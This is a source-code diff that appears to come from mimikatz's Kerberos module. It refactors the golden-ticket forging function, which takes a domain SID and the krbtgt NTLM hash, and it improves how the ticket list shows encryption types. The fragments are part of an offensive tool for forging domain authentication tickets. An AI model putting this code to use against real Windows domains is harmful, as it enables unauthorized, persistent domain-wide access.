@@ -169,7 +169,7 @@ NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[])
 		{
 			for(i = 0; i < pKerbCacheResponse->CountOfTickets; i++)
 			{
-				kprintf(L"\n[%08x] - %02x", i, pKerbCacheResponse->Tickets[i].EncryptionType);
+				kprintf(L"\n[%08x] - 0x%08x - %s", i, pKerbCacheResponse->Tickets[i].EncryptionType, kuhl_m_kerberos_ticket_etype(pKerbCacheResponse->Tickets[i].EncryptionType));
 				kprintf(L"\n   Start/End/MaxRenew: ");
 				kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].StartTime); kprintf(L" ; ");
 				kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].EndTime); kprintf(L" ; ");
@@ -242,7 +242,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
 	BYTE ntlm[LM_NTLM_HASH_LENGTH] = {0};
 	DWORD i, j, nbGroups, id = 500;
-	PCWCHAR szUser, szDomain, szSid, szNtlm, szId, szGroups, base, filename;
+	PCWCHAR szUser, szDomain, szSid, szNTLM, szId, szGroups, base, filename;
 	PISID pSid;
 	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
 	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
@@ -257,7 +257,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 			{
 				if(ConvertStringSidToSid(szSid, (PSID *) &pSid))
 				{
-					if(kull_m_string_args_byName(argc, argv, L"krbtgt", &szNtlm, NULL))
+					if(kull_m_string_args_byName(argc, argv, L"krbtgt", &szNTLM, NULL))
 					{
 						if(kull_m_string_args_byName(argc, argv, L"id", &szId, NULL))
 							id = wcstoul(szId, NULL, 0);
@@ -293,14 +293,8 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 							groups = defaultGroups;
 							nbGroups = sizeof(defaultGroups) / sizeof(GROUP_MEMBERSHIP);
 						}
-																		
-						if(wcslen(szNtlm) == (LM_NTLM_HASH_LENGTH * 2))
+						if(kull_m_string_stringToHex(szNTLM, ntlm, sizeof(ntlm)))												
 						{
-							for(i = 0; i < LM_NTLM_HASH_LENGTH; i++)
-							{
-								swscanf_s(&szNtlm[i*2], L"%02x", &j);
-								ntlm[i] = (BYTE) j;
-							}
 							kprintf(
 								L"User      : %s\n"
 								L"Domain    : %s\n"
@@ -334,7 +328,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 		}
 		else PRINT_ERROR(L"Missing domain argument\n");
 	}
-	else PRINT_ERROR(L"Missing admin argument\n");
+	else PRINT_ERROR(L"Missing user argument\n");
 
 	if(dynGroups)
 		LocalFree(groups);
